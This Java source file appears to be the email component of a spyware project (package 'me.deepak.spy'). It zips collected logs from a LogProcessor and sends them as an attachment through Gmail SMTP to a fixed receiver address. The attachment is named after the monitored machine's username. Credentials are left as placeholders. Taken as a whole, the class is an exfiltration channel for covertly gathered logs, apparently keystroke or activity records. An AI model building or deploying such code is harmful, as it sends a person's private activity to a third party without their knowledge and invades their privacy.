package me.deepak.spy.email;

import java.io.File;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import me.deepak.spy.log.LogProcessor;

/**
 * Class to send email.
 * 
 * @author deepak
 */

public final class EmailSender {

	private EmailSender() {
	}

	private static final String HOST = "smtp.gmail.com";
	private static final String PORT = "587";
	private static final String USER = "{USER}";
	private static final String PASSWORD = "{PASSWORD}";
	private static final String SENDER_EMAIL = "{USER}@gmail.com";
	private static final String RECEIVER_EMAIL = "RECEIVER_EMAIL";

	/**
	 * This method does three works. 1. Get Session 2. Compose Message 3. Send
	 * Message
	 * 
	 * @author deepak
	 */

	public static boolean sendEmail(LogProcessor logProcessor) {
		Session session = getSession();
		try {
			Message message = composeMessage(logProcessor, session);
			sendMessage(session, message);
			return true;
		} catch (MessagingException e) {
			System.err.println("Exception occured while sending email is : " + e);
			return false;
		}
	}

	/**
	 * This method adds given properties : mail.smtp.host, mail.smtp.port,
	 * mail.smtp.user, mail.smtp.password, mail.smtp.starttls.enable,
	 * mail.smtps.auth to java.util.Properties and returns javax.mail.Session
	 * 
	 * @author deepak
	 */

	private static Session getSession() {

		Properties properties = System.getProperties();
		properties.put("mail.smtp.host", HOST);
		properties.put("mail.smtp.port", PORT);
		properties.put("mail.smtp.user", USER);
		properties.put("mail.smtp.password", PASSWORD);
		properties.put("mail.smtp.starttls.enable", "true");
		properties.put("mail.smtps.auth", "true");
		return Session.getInstance(properties);
	}

	/**
	 * This method composes message based on given infos.
	 * 
	 * @author deepak
	 */

	private static Message composeMessage(LogProcessor logProcessor, Session session) throws MessagingException {

		InternetAddress senderAddress = new InternetAddress(SENDER_EMAIL);
		InternetAddress receiverAddress = new InternetAddress(RECEIVER_EMAIL);
		Message message = new MimeMessage(session);
		message.setFrom(senderAddress);
		message.setRecipient(Message.RecipientType.TO, receiverAddress);
		String emailSubject = getEmailSubject(logProcessor);
		message.setSubject(emailSubject);
		BodyPart bodyPart = new MimeBodyPart();
		File logFile = new File(logProcessor.getZippedLogFilePath());
		DataSource source = new FileDataSource(logFile);
		bodyPart.setDataHandler(new DataHandler(source));
		bodyPart.setFileName(emailSubject);
		Multipart multipart = new MimeMultipart();
		multipart.addBodyPart(bodyPart);
		message.setContent(multipart);
		return message;
	}

	/**
	 * This method sends message.
	 * 
	 * @author deepak
	 */

	private static void sendMessage(Session session, Message message) throws MessagingException {

		Transport transport = session.getTransport("smtps");
		transport.connect(HOST, USER, PASSWORD);
		transport.sendMessage(message, message.getAllRecipients());
		transport.close();
	}

	/**
	 * This method returns email subject as "{user.name}-logs.zip"
	 * 
	 * @author deepak
	 */

	private static String getEmailSubject(LogProcessor logProcessor) {
		return new StringBuilder(System.getProperty("user.name")).append("-")
				.append(logProcessor.getZippedLogFileName()).toString();
	}
}
